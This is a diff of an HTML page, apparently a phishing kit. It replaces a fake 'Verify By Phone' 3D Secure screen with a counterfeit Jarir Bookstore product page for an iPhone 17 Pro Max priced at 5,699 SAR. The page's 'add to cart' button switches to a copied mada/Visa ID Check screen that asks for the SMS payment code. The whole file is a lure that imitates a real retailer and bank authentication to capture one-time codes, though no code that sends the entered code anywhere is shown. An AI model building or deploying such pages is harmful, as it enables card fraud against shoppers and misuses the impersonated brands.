@@ -1,184 +1,130 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جرير - آيفون 17 برو ماكس</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            background-color: #ffffff;
-            margin: 0;
-            padding: 20px;
+        :root {
+            --jarir-red: #E30613;
+            --jarir-navy: #2D3E50;
         }
+        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; }
+        
+        /* تنسيق صفحة جرير */
+        #jarir-page { display: flex; flex-direction: column; min-height: screen; }
+        .product-section { background: #ffffff; display: flex; justify-content: center; align-items: center; padding: 20px 0; }
+        .phone-image { width: 260px; height: auto; object-fit: contain; filter: drop-shadow(0 15px 25px rgba(0,0,0,0.1)); }
+        .btn-red { background-color: var(--jarir-red); transition: 0.3s; cursor: pointer; }
+        .btn-red:active { transform: scale(0.98); opacity: 0.9; }
+        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }
+        .accordion-content.active { max-height: 200px; }
+        .rotate-icon { transition: transform 0.3s; }
+        .rotate-icon.active { transform: rotate(180deg); }
 
-        .container {
-            max-width: 480px;
-            margin: 0 auto;
-        }
-
-        .top-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .back-btn {
-            color: #0000FF;
-            font-size: 28px;
-            font-weight: bold;
-            text-decoration: none;
-        }
-
-        .cancel-btn {
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        /* تنسيق الشعارات - التعديل هنا */
-        .header-logos {
-            display: flex;
-            justify-content: space-between;
-            align-items: center; /* لجعلهما على خط واحد */
-            margin-bottom: 10px;
-        }
-
-        .mada-logo img {
-            height: 60px; /* نفس مقاس مدى */
-            width: auto;
-            display: block;
-        }
-
-        .visa-master-logo img {
-            height: 60px; /* تم تكبيره ليتساوى مع شعار مدى تماماً */
-            width: auto;
-            display: block;
-        }
-
-        .id-check-label {
-            text-align: right;
-            font-size: 12px;
-            color: #444;
-            font-weight: 500;
-            margin-top: 2px;
-        }
-
-        hr {
-            border: 0;
-            border-top: 1.5px solid #f0f0f0;
-            margin: 15px 0 30px 0;
-        }
-
-        h1 {
-            font-family: "Times New Roman", Times, serif;
-            font-size: 26px;
-            margin: 0 0 25px 0;
-        }
-
-        p {
-            font-size: 17px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        .form-section {
-            text-align: center;
-            margin-top: 50px;
-        }
-
-        .input-hint {
-            display: block;
-            font-size: 15px;
-            color: #888;
-            margin-bottom: 15px;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            max-width: 350px;
-            height: 55px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 24px;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .confirm-button {
-            width: 100%;
-            background-color: #0000FF;
-            color: white;
-            border: none;
-            padding: 16px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            text-transform: uppercase;
-        }
-
-        .resend-text {
-            display: block;
-            margin-top: 40px;
-            color: #0000FF;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 16px;
-            margin-bottom: 60px;
-        }
-
-        .footer-nav {
-            border-top: 1px solid #eee;
-        }
-
-        .footer-link {
-            display: flex;
-            justify-content: space-between;
-            padding: 18px 0;
-            color: #00008B;
-            text-decoration: none;
-            font-size: 16px;
-        }
+        /* تنسيق صفحة الـ 3D Secure (مخفية في البداية) */
+        #bank-page { display: none; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; direction: ltr; text-align: left; padding: 20px; background: #fff; }
+        .bank-container { max-width: 450px; margin: 0 auto; }
+        .mada-logo-large img { height: 60px; width: auto; }
+        .visa-logo-large img { height: 60px; width: auto; }
+        .confirm-btn-blue { width: 100%; background-color: #0000FF; color: white; border: none; padding: 16px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 20px; }
+        
+        .hide-scrollbar::-webkit-scrollbar { display: none; }
     </style>
 </head>
-<body>
+<body class="max-w-md mx-auto shadow-2xl min-h-screen bg-white">
 
-<div class="container">
-    <div class="top-bar">
-        <a href="#" class="back-btn">&#10094;</a>
-        <div class="cancel-btn">Cancel</div>
+    <div id="jarir-page">
+        <header class="p-4 border-b sticky top-0 bg-white z-50">
+            <div class="flex items-center justify-between mb-3">
+                <i class="fa-solid fa-bars text-xl text-gray-700"></i>
+                <div class="flex items-center gap-1">
+                    <span class="text-2xl font-black text-[#E30613]">JARIR</span>
+                </div>
+                <div class="relative">
+                    <i class="fa-solid fa-cart-shopping text-xl text-gray-700"></i>
+                    <span class="absolute -top-2 -right-2 bg-[#E30613] text-white text-[10px] rounded-full w-4 h-4 flex items-center justify-center">1</span>
+                </div>
+            </div>
+            <div class="relative">
+                <input type="text" value="iphone 17 pro max" readonly class="w-full bg-gray-100 rounded-lg py-2 pr-10 pl-4 text-sm text-right outline-none text-gray-500">
+                <i class="fa-solid fa-magnifying-glass absolute right-3 top-3 text-gray-400"></i>
+            </div>
+        </header>
+
+        <section class="product-section">
+            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" alt="iPhone 17 Pro Max" class="phone-image">
+        </section>
+
+        <main class="p-5">
+            <div class="flex items-center justify-between mb-2">
+                <h1 class="text-xl font-extrabold text-gray-900">ابل آيفون 17 برو ماكس</h1>
+                <i class="fa-brands fa-apple text-3xl text-gray-800"></i>
+            </div>
+            <div class="mb-6 bg-red-50 p-4 rounded-2xl flex justify-between items-center border border-red-100">
+                <div class="text-[#E30613] text-3xl font-black">5,699 <span class="text-sm">ر.س</span></div>
+            </div>
+
+            <button onclick="showBankPage()" class="btn-red w-full text-white font-bold py-4 rounded-xl text-lg mb-8 shadow-lg">
+                أضف إلى السلة
+            </button>
+        </main>
+
+        <footer class="bg-[#2D3E50] text-white p-6 mt-auto">
+            <p class="text-center text-[10px]">جميع الحقوق محفوظة لمكتبة جرير © 2026</p>
+        </footer>
     </div>
 
-    <div class="header-logos">
-        <div class="mada-logo">
-            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
+    <div id="bank-page">
+        <div class="bank-container">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <div style="color: #0000FF; font-size: 28px;">&#10094;</div>
+                <div style="font-weight: bold;">Cancel</div>
+            </div>
+
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <div class="mada-logo-large">
+                    <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
+                </div>
+                <div style="text-align: right;">
+                    <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 60px;">
+                    <div style="font-size: 12px; color: #444;">ID Check</div>
+                </div>
+            </div>
+
+            <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+
+            <h1 style="font-family: 'Times New Roman'; font-size: 26px; font-weight: bold;">Verify By Phone</h1>
+            <p style="font-size: 16px;">We have sent you a text message with a code to your registered mobile number.</p>
+            <p style="font-size: 16px;">You are paying <strong>Jarir Bookstore</strong> the amount of <strong>SAR 5,699</strong> on 2026/02/15.</p>
+
+            <div style="text-align: center; margin-top: 40px;">
+                <label style="color: #888; font-size: 14px; display: block; margin-bottom: 10px;">Verification code</label>
+                <input type="text" style="width: 100%; height: 50px; border: 1px solid #ccc; text-align: center; font-size: 24px; border-radius: 4px;">
+                <button class="confirm-btn-blue">CONFIRM</button>
+                <a href="#" style="display: block; margin-top: 30px; color: #0000FF; font-weight: bold; text-decoration: none;">RESEND CODE</a>
+            </div>
         </div>
-        <div class="visa-master-logo">
-            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Visa Mastercard">
-            <div class="id-check-label">ID Check</div>
-        </div>
     </div>
 
-    <hr>
+    <script>
+        // وظيفة التبديل بين الصفحات
+        function showBankPage() {
+            document.getElementById('jarir-page').style.display = 'none';
+            document.getElementById('bank-page').style.display = 'block';
+            window.scrollTo(0, 0); // للعودة لأعلى الصفحة عند التبديل
+        }
 
-    <h1>Verify By Phone</h1>
-
-    <p>We have sent you a text message with a code to your registered mobile number.</p>
-    
-    <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>
-
-    <div class="form-section">
-        <label class="input-hint">Verification code</label>
-        <input type="text">
-        <button class="confirm-button">Confirm</button>
-        <a href="#" class="resend-text">RESEND CODE</a>
-    </div>
-
-    <div class="footer-nav">
-        <a href="#" class="footer-link">Learn more about authentication <span>+</span></a>
-        <a href="#" class="footer-link">Need some help ? <span>+</span></a>
-    </div>
-</div>
-
+        function toggleAcc(id) {
+            const content = document.getElementById(`content-${id}`);
+            const icon = document.getElementById(`icon-${id}`);
+            content.classList.toggle('active');
+            icon.classList.toggle('active');
+        }
+    </script>
 </body>
 </html>
